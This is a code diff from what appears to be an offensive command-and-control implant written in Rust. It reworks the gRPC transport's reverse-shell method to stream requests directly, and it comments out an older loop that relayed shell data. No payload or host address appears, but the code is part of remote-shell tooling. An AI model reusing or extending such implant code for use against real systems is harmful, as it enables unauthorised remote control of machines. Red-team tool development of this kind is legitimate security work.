@@ -1,4 +1,5 @@
 use crate::Transport;
+use anyhow::anyhow;
 use anyhow::Result;
 use pb::c2::*;
 use std::sync::mpsc::{Receiver, Sender};
@@ -118,43 +119,30 @@ impl Transport for GRPC {
 
     async fn reverse_shell(
         &mut self,
-        rx: Receiver<ReverseShellRequest>,
-        tx: Sender<ReverseShellResponse>,
-    ) -> Result<()> {
-        let out_stream = tokio_stream::iter(rx);
-        let tonic_req = Request::new(out_stream);
-        let resp = self.reverse_shell_impl(tonic_req).await?;
-        let mut in_stream = resp.into_inner();
+        req: tokio_stream::wrappers::ReceiverStream<ReverseShellRequest>,
+    ) -> std::result::Result<
+        tonic::Response<tonic::codec::Streaming<ReverseShellResponse>>,
+        tonic::Status,
+    > {
+        // let stream = tokio_stream::iter(req);
+        self.reverse_shell_impl(req).await
 
-        tokio::spawn(async move {
-            loop {
-                let msg = match in_stream.message().await {
-                    Ok(maybe_msg) => match maybe_msg {
-                        Some(msg) => msg,
-                        None => {
-                            break;
-                        }
-                    },
-                    Err(_err) => {
-                        #[cfg(debug_assertions)]
-                        log::error!("failed to receive shell data: {}", _err);
+        // while let Some(msg) = in_stream.message().await? {
+        //     match tx.send(msg).await {
+        //         Ok(_) => {
+        //             #[cfg(debug_assertions)]
+        //             log::info!("TTY Input Sent");
+        //         }
+        //         Err(_err) => {
+        //             #[cfg(debug_assertions)]
+        //             log::error!("failed to send tty input: {}", _err);
 
-                        return;
-                    }
-                };
-                match tx.send(msg) {
-                    Ok(_) => {}
-                    Err(_err) => {
-                        #[cfg(debug_assertions)]
-                        log::error!("failed to send shell data: {}", _err);
+        //             return Err(anyhow!("failed: {}", _err));
+        //         }
+        //     }
+        // }
 
-                        return;
-                    }
-                }
-            }
-        });
-
-        Ok(())
+        // Ok(())
     }
 }
 
